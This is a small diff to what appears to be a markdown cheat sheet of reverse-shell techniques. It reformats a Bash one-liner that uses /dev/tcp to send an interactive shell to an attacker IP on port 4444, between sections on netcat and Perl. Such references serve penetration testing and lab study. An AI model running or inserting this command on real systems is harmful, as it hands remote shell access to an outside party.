@@ -17,7 +17,7 @@ If you require to use old versions of netcat you can do so by
 
 ### 2. Bash
 
-> bash -i >& /dev/tcp/<attacker ip>/4444 0>&1  
+	bash -i >& /dev/tcp/<attacker ip>/4444 0>&1  
 
 ### 3. PERL  
 Good ol' PERL, nearly every system has it and is a cornerstone of utility -
